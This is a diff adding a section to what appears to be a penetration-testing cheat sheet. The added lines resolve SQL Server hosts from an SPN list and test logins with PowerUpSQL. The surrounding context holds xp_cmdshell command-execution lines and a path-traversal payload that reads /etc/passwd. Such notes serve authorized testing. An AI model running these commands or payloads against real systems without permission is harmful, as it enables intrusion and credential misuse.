@@ -323,6 +323,18 @@ MySQL
   `Invoke-SQLOSCmd -Instance "sql1.domain.local,1433" -Command "whoami" -RawResults`   
   Using mssqlclientpy:    
   `EXEC xp_cmdshell 'whoami';`    
+  
+### Using SPN List
+**Resolve all hosts for their IP** (If needed to check in scope items):   
+```powershell
+foreach($entry in (get-content "C:\Users\bob\Desktop\sqlhostnames.txt")){
+    $dnsentry = Resolve-DnsName -Name $entry -TcpOnly -Server 10.0.0.1 -ErrorAction SilentlyContinue
+    if($dnsentry.count -gt 0){ $dnsentry | % {"$($_.Name),$($_.IPAddress)"} }else{ "$entry,N/A" }
+    start-sleep -Seconds 5
+}
+```
+Use the list with PowerUpSQL:
+`get-content .\sqlinstances.txt | Get-SQLConnectionTest -Verbose -Username "domain\user" -password "asdfasdf"` 
 
 ## File inclusion
 - LFI: http://target.com/?page=home --> http://target.com/?page=./../../../../../../../../../etc/passwd%00
